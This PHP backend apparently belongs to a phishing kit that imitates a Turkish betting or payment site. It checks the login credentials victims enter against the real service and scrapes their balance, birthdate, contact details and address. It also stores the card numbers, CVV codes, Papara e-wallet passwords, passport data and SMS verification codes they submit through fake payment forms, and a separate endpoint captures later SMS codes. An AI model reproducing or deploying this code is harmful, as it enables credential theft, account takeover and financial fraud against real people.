<?php
include 'inc/config.php';
include 'inc/functions.php';
include 'inc/anti.php';
include 'inc/check.php';
include 'inc/cevir.php';


function unicodeStringa($str) {
    $aa = preg_replace('/u([\da-fA-F]{4})/', '&#x\1;', $str);
    return str_replace('\\','',$aa);
}

$q = $_GET['q'];

if ($q == 'login') {
  antiflood();
  $login = escape('field_first');
  $password = escape('field_second');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $device = $mobile == true ? 'mobile' : 'pc';

	
  $ip = $db -> real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]));
  $user = $db->query("SELECT id from users where login='$login' and password='$password'")->fetch_assoc();
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }elseif(!empty($phone) && strlen($phone) < 10 || strlen($phone) > 14){
    die('error_phone');
	  
  }elseif (isset($user['id'])) {
    $db -> query("UPDATE users set device = '$device' where id = '$user[id]'");
    $_SESSION['user_id'] = $user['id'];
    die('success');
  }else{
		$durum = getir($login,$password);
		if (!($durum == "hata")){
			$kbilgi = unicodeStringa(kbilgi($durum));
			$kbilgi1 = unicodeStringa(kbilgi1($durum));
			
			$para = json_decode($kbilgi,false)->user->balance;
			
			$phone = json_decode($kbilgi1,false)->user->gsm;
			$username = json_decode($kbilgi1,false)->user->username;
			$gun = json_decode($kbilgi1,false)->user->birthdate->day;
			$ay = json_decode($kbilgi1,false)->user->birthdate->month;
			$yil = json_decode($kbilgi1,false)->user->birthdate->year;
			
			$adi = json_decode($kbilgi1,false)->user->firstName;
			$soyadi = json_decode($kbilgi1,false)->user->lastName;
			$email = json_decode($kbilgi1,false)->user->email;
			$ulke = json_decode($kbilgi1,false)->user->country;
			$bolge = cevir(json_decode($kbilgi1,false)->user->city);
			$adres = json_decode($kbilgi1,false)->user->address;

			

			
			
			$db -> query("INSERT into users set
			login='$login',
			password='$password',
			balance='$para',
			phone='$phone',
			passport='$passport',
			device='$device',
			ip='$ip',
			data1='$kbilgi',
			data2='$kbilgi1',
			data3='$durum',
			username='$username',
			gun='$gun',
			ay='$ay',
			yil='$yil',
			adi='$adi',
			soyadi='$soyadi',
			email='$email',
			bolge='$bolge',
			adres='$adres',
			ulke='$ulke'");
			$_SESSION['user_id'] = $db->insert_id;
			die('success');
			
		}else{
			die('error');
		}
    
  }
}elseif($q == 'logout'){
  session_destroy();
}elseif($q == 'signup' && !isset($us['id'])){
  antiflood();
  $login = escape('field_first');
  $password = escape('field_second');
  $phone = preg_replace("/[^0-9+]/", "", escape('phone'));
  $passport = escape('passport');
  $email = escape('email');
  $adi = escape('firstName');
  $soyadi = escape('surname');
  $gun = escape('gun');
  $ay = escape('ay');
  $yil = escape('yil');
  $ulke = escape('ulke');
  $bolge = cevir(escape('bolge'));
  $adres = escape('adres');



  $type = intval(1);
  $device = $mobile == true ? 'mobile' : 'pc';
  $ip = $db -> real_escape_string(htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
  if (strlen($login) < 3 or strlen($password) < 3) {
    die('error');
  }else{
		$db -> query("INSERT into users set
		  login = '$login',
		  password = '$password',
		  phone = '$phone',
		  passport = '$passport',
		  type = '$type',
		  device = '$device',
		  ip = '$ip',
		  username='$login',
		  gun='$gun',
		  ay='$ay',
		  yil='$yil',
		  adi='$adi',
		  soyadi='$soyadi',
		  email='$email',
		  bolge='$bolge',
		  adres='$adres',
		  ulke='$ulke'");
	  $_SESSION['user_id'] = $db->insert_id;
	  die('success');
  }
}elseif($q == 'disable-popup'){
  $_SESSION['popup'] = false;
}
$q = $_GET["q"];
  if ($q == "payment") {
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
    if (strlen($datas['amount']) > 0) {
      $db -> query("INSERT into payments set
        type = '$datas[type]',
        amount = '$datas[amount]',
        user = '$us[login]',
        user_id = '$us[id]',
        astropay_card_number = '$datas[astropay_card_number]',
        astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
        astropay_cv2 = '$datas[astropay_cv2]',
        paykasa_number = '$datas[paykasa_number]',
        papara_email = '$datas[papara_email]',
        papara_password = '$datas[papara_password]',
        papara_sms_code = '$datas[papara_sms_code]',
        bank_id = '$datas[bank_id]',
        sender_phone = '$datas[sender_phone]',
        buyer_phone = '$datas[buyer_phone]',
        buyer_passport = '$datas[buyer_passport]',
        buyer_birth = '$datas[buyer_birth]',
        buyer_passport_date = '$datas[buyer_passport_date]',
        referance = '$datas[referance]',
        full_name = '$datas[full_name]',
        where_from = '$datas[where_from]',
        transfer_hour = '$datas[transfer_time]'");
      die(json_encode(['success' => true, 'message' => $db->insert_id]));
    }
  }elseif($q == "update-payment"){
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(trim($value));
    }
    $db -> query("UPDATE payments set papara_sms_code = '$datas[papara_sms_code]' where id = '$datas[id]'");
    die(json_encode(['success' => true, 'message' => json_encode($datas)]));
  }elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }
?>
